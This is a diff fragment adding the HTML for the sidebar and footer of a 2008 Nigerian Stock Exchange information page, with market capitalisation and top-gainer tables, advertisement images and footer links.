+<div class="graphTitle">NSE Capitalisation</div>
+<IFRAME id="graphFrame2" name="graphFrame2" width="195" height="140" frameborder="no" scrolling="no" src="capitalisation_graph.php"></IFRAME>
+</div>
+<div class="graphTable">
+<table class="graphTableHeader" width="100%"  border="0" cellspacing="0" cellpadding="2">
+<tr>
+<td width="60">Value</td>
+<td width="60">Net Change</td>
+<td align="right">% Change&nbsp;</td>
+</tr>
+</table>
+</div>
+
+<div class="graphBottom">
+<table class="graphTableBottom" width="100%"  border="0" cellspacing="0" cellpadding="2">
+<tr>
+<td width="60"><b>2.61 T</b></td>
+<td width="60"><b>--443,882,034,240.72 </b></td>
+<td align="right"><b>--14.52</b>&nbsp;</td>
+</tr>
+</table>
+&nbsp;Nov 13, 2008<br><br>
+</div>
+<br>
+
+</td>
+</tr>
+</table>
+</td>
+</tr>
+
+<tr id="glDiv" style="display: none;">
+<td>
+<table width="100%" class="text" border="0" cellspacing="0" cellpadding="0">
+
+<tr>
+<td class="sideMiddleGrey">
+<span class="title">Gainers / Loosers</span><br><br />
+<div class="gl">
+<div class="graphTitle">
+Top Gainers
+</div>
+<table width="100%"  border="0" cellpadding="5" cellspacing="0" class="glTable">
+<tr>
+<td>Symbol</td>
+<td align="right">Price</td>
+<td align="right">Change</td>
+<td align="right">Volume</td>
+</tr>
+<tr>
+<td><a class="newsLink" href="quoted_company_details.php?id=976">7UP</a></td>
+<td align="right">414,565.00</td>
+<td align="right">+414,565.000</td>
+<td align="right">64,165</td>
+</tr>
+</table>
+</div><!-- gl -->
+
+<div class="gl">
+<div class="graphTitle">
+Top Loosers
+</div>
+<table class="glTable" width="100%"  border="0" cellspacing="0" cellpadding="5">
+<tr>
+<td>Symbol</td>
+<td align="right">Price</td>
+<td align="right">Change</td>
+<td align="right">Volume</td>
+</tr>
+</table>
+</div><!-- gl -->
+<br />
+</td>
+</tr>
+</table>
+</td>
+</tr>
+
+<tr>
+<td class="sideBottomGrey"></td>
+</tr>
+
+<tr>
+<td class="sideTopGrey">Advertisements</td>
+</tr>
+
+<tr>
+<td class="sideMiddleGrey">
+<img src="images/sec_ad.jpg">
+<br><br>
+<img src="images/cscs_ad.gif">
+</td>
+</tr>
+
+<tr>
+<td class="sideBottomGrey"></td>
+</tr>
+
+</table>
+</td>
+</tr>
+</table>
+
+
+
+</td>
+
+</tr>
+
+<tr>
+
+<td valign="top">
+
+<div class="footer">
+
+<center>
+
+<a class="bottomMenu" href="/">Home</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;
+
+<a class="bottomMenu" href="http://www.nigerianstockexchange.info/terms.php">Terms of Service</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;
+
+<a class="bottomMenu" href="http://www.nigerianstockexchange.info/privacy.php">Privacy Policy</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;
+
+<a class="bottomMenu" href="http://www.nigerianstockexchange.info/disclaimer.php">Disclaimer</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;
+
+<a class="bottomMenu" href="http://www.nigerianstockexchange.info/contact_us.php">Contact us</a>
+
+<br><br>? <script type="text/javascript">
+
+var d = new Date();
+document.write(d.getYear());
+
+</script> Nigerian Stock Exchange<br>
+
+<br>
+
+</center>
+
+</div>
+
+</td>
+
+</tr>
+
+</table>
+
+	
+
+
+</td>
+
+</tr>
+
+</table>
+
+</td>
+
+</tr>
+
+</table>
+
+</body>
+
+</html>
+
